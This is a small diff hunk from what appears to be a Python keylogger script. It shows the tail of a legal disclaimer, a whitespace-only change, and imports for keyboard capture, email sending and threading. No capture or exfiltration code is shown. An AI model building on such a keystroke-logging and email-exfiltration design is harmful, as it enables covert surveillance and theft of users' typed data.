@@ -6,8 +6,6 @@ Running such tools without the explicit consent of the user is strictly prohibit
 in many countries and can lead to serious legal consequences.
 
 """
-
-
 import pynput.keyboard  # For capturing keyboard inputs
 import smtplib  # For sending emails
 import threading  # For executing periodic tasks using threads
